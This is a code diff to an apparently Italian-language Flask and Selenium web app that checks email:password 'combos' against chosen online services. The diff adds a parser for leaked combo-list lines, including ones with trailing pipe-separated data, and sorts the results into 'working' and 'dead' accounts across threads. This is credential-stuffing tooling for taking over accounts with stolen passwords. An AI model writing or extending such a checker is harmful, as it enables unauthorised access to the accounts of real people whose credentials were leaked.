@@ -8,6 +8,7 @@ from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 import time
 import os
+import re
 from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
@@ -137,6 +138,23 @@ def check_credential(service_key, email, password):
             except:
                 pass
 
+def extract_combo(line):
+    line = line.strip()
+    if not line:
+        return None
+    # Match email:password even if followed by | or other text
+    m = re.search(r'([\w.+-]+@[\w.-]+\.[a-zA-Z]{2,})\s*[:;]\s*([^\s|]+)', line)
+    if m:
+        return m.group(1).strip(), m.group(2).strip()
+    # Fallback simple split
+    if ':' in line:
+        parts = line.split(':', 1)
+        email = parts[0].strip()
+        password = parts[1].split('|')[0].strip() if '|' in parts[1] else parts[1].strip()
+        if '@' in email and password:
+            return email, password
+    return None
+
 @app.route("/")
 def index():
     return render_template("index.html", services=SERVICES)
@@ -145,22 +163,22 @@ def index():
 def check():
     data = request.json
     service = data.get("service")
-    combos = data.get("combos", "").strip().splitlines()
+    raw = data.get("combos", "")
+    lines = raw.strip().splitlines()
     
     results = {"working": [], "dead": [], "error": []}
     
-    def process(combo):
-        if ":" not in combo:
-            return {"email": combo, "status": "error", "message": "formato email:pass richiesto"}
-        email, password = combo.split(":", 1)
-        email = email.strip()
-        password = password.strip()
+    def process(line):
+        combo = extract_combo(line)
+        if not combo:
+            return {"email": line[:40], "status": "error", "message": "formato non riconosciuto"}
+        email, password = combo
         if not email or not password:
-            return {"email": email, "status": "error", "message": "vuoto"}
+            return {"email": email or line[:40], "status": "error", "message": "vuoto"}
         return check_credential(service, email, password)
     
     with ThreadPoolExecutor(max_workers=2) as executor:
-        futures = [executor.submit(process, c.strip()) for c in combos if c.strip()]
+        futures = [executor.submit(process, ln) for ln in lines if ln.strip()]
         for f in futures:
             res = f.result()
             results[res["status"]].append(res)
